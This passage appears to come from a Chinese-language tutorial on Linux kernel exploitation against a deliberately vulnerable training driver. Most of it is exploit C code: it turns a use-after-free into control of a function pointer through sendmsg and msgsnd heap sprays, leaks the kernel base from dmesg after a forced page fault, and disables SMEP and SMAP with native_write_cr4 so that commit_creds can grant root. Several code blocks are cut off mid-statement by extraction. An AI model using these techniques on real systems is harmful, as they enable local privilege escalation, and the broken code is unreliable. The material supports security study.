  4. **释放一个Chunk，交互码`0xFE06`：**
        case 0xFE06u:
        kfree(global_uaf_obj);
        printk(&unk_843); // 4[x] uaf object freed [x]
        result = 0LL;
        break;
这里的漏洞很明显，程序在释放那个`Chunk`时，并没有将其释放后的指针清零，这将造成`UAF`漏洞。
#### 利用`k_obj`控制执行流
那么，如果我们首先创建一个`Chunk`并释放，`global_uaf_obj`将指向一个已被释放的`0x58`大小的`Chunk`，接下来我们创建一个`k_obj`，由于大小相近，他们将处于同一个`cache`，而`k_obj`的内容是可控的，这将导致我们可以控制`global_uaf_obj
-> fn`利用代码如下：
    //gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread
    #include
    #include
    #include
    #include
    #include
    #include
    void init(){
            setbuf(stdin,0);
            setbuf(stdout,0);
            setbuf(stderr,0);
    }
    size_t user_cs, user_rflags, user_ss, user_rsp;
    void save_user_status(){
        __asm__(
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
        );
        puts("[+] Save User Status");
        printf("user_cs = %pn",user_cs);
        printf("user_ss = %pn",user_ss);
        printf("user_rsp = %pn",user_rsp);
        printf("user_rflags = %pn",user_rflags);
        puts("[+] Save Success");
    }
    int main(int argc,char * argv[]){
        init();
        save_user_status();
        int fd = open("/dev/vulnerable_device",0);
        if (fd 
    #include
    #include
    #include
    #include
    #include
    #include
    #include
    #include
    #define BUFF_SIZE 0x60
    void init(){
        ......
    }
    size_t user_cs, user_rflags, user_ss, user_rsp;
    void save_user_status(){
        ......
    }
    void heap_spray_sendmsg(int fd, size_t target, size_t arg)
    {
        char buff[BUFF_SIZE];
        struct msghdr msg={0};
        struct sockaddr_in addr={0};
        int sockfd = socket(AF_INET,SOCK_DGRAM,0);
        memset(buff, 0x43 ,sizeof buff);
        memcpy(buff+56, &arg ,sizeof(long));
        memcpy(buff+56+(sizeof(long)), &target ,sizeof(long));
        addr.sin_addr.s_addr=htonl(INADDR_LOOPBACK);
        addr.sin_family=AF_INET;
        addr.sin_port=htons(6666);
        msg.msg_control=buff;
        msg.msg_controllen=BUFF_SIZE;
        msg.msg_name=(caddr_t)&addr;
        msg.msg_namelen= sizeof(addr);
        ioctl(fd, 0xFE03, NULL);
        ioctl(fd, 0xFE06, NULL);
        for (int i=0;i
    #include
    #include
    #include
    #include
    #include
    #include
    #include
    #include
    #define BUFF_SIZE 0x60
    void init(){
        ......
    }
    size_t user_cs, user_rflags, user_ss, user_rsp;
    void save_user_status(){
        ......
    }
    int heap_spray_msgsnd(int fd, size_t target, size_t arg){
        int new_len = BUFF_SIZE - 48;
        struct {
            size_t mtype;
            char mtext[new_len];
        } msg;
        memset(msg.mtext,0x42,new_len-1);
        memcpy(msg.mtext+56-48,&arg,sizeof(long));
        memcpy(msg.mtext+56-48+(sizeof(long)),&target,sizeof(long));
        msg.mtext[new_len]=0;
        msg.mtype=1; 
        int msqid=msgget(IPC_PRIVATE,0644 | IPC_CREAT);
        ioctl(fd, 0xFE03, NULL);
        ioctl(fd, 0xFE06, NULL);
        for (int i=0;i] ? do_ioctl+0x34d/0x4c0
[vuln_driver]`，我们可以据此计算出内核加载基址。
**⚠：若使用此方法来绕过`kaslr`，我们必须保证触发`crash`时内核不会被重启，这要求我们的QEMU语句中不能存在`oops=panic
panic=1`语句，这一句的意义是，将`oops`类型的错误视为`panic`错误进行处理，对于`panic`错误，经过1秒重启内核。**
    // 构造 page_fault 泄露kernel地址。从dmesg读取后写到/tmp/infoleak，再读出来
    pid_t pid=fork();
    if (pid==0){
        do_page_fault();
        exit(0);
    }
    int status;
    wait(&status);
    //sleep(10);
    printf("[+] Begin to leak address by dmesg![+]n");
    size_t kernel_base = get_info_leak()-sys_ioctl_offset;
    printf("[+] Kernel base addr : %p [+] n", kernel_base);
    native_write_cr4_addr+=kernel_base;
    prepare_kernel_cred_addr+=kernel_base;
    commit_creds_addr+=kernel_base;
#### 利用`native_write_cr4`绕过`SMEP`、`SMAP`
这个函数是一个内核级的函数，如果可以控制函数执行流以及第一个参数，我们就可以向`CR4`寄存器写入任意值。
函数在`/v4.6-rc1/source/arch/x86/include/asm/special_insns.h#L82`处实现：
    static inline void native_write_cr4(unsigned long val)
    {
        asm volatile("mov %0,%%cr4": : "r" (val), "m" (__force_order));
    }
而我们此处的堆喷利用恰好满足条件，那么我们结合堆喷以及之前泄露内核加载基址的方式可以得到以下利用代码：
    //gcc ./exploit.c -o exploit -static -fno-stack-protector -masm=intel -lpthread
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define sys_ioctl_offset 0x22FB79
    #define BUFF_SIZE 0x60
    #define GREP_INFOLEAK "dmesg | grep SyS_ioctl+0x79 | awk '{print $3}' | cut -d '' -f 1 > /tmp/infoleak"
    void init(){
        ......
    }
    size_t user_cs, user_rflags, user_ss, user_rsp;
    size_t native_write_cr4_addr = 0x64500;
    size_t prepare_kernel_cred_addr = 0xA40B0;
    size_t commit_creds_addr = 0xA3CC0;
    void save_user_status(){
        ......
    }
    int heap_spray_msgsnd(int fd, size_t target, size_t arg){
        ......
    }
    void leak_kernel_base(){
        ......
    }
    int main(int argc,char * argv[]){
        init();
        save_user_status();
        leak_kernel_base();
        int fd = open("/dev/vulnerable_device",0);
        if (fd 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define sys_ioctl_offset 0x22FB79
    #define BUFF_SIZE 0x60
    #define GREP_INFOLEAK "dmesg | grep SyS_ioctl+0x79 | awk '{print $3}' | cut -d '' -f 1 > /tmp/infoleak"
    void init(){
            setbuf(stdin,0);
            setbuf(stdout,0);